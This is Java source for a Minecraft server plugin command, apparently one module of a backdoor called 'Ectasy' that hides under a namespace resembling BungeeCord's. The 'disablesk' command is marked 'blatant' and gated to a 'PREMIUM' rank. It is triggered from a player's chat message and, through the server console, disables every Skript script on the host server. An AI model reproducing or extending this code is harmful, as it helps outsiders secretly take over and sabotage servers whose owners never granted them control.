package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.io.File;
import java.util.Objects;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "disablesk",
   description = "Disable all skripts",
   blatant = true,
   rank = Rank.PREMIUM
)
public class DisableSkriptCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      File var4 = new File("plugins/Skript/scripts");
      if (!var4.exists()) {
         ChatUtil.sendChat(var1.getPlayer(), "Skript folder not found.");
      } else {
         for(String var8 : Objects.requireNonNull(var4.list())) {
            if (var8.endsWith("sk") && !var8.startsWith("-")) {
               Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
                  Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "skript disable " + var8);
               });
               ChatUtil.sendChat(var1.getPlayer(), "Disabling " + var8);
            }
         }
      }
   }
}
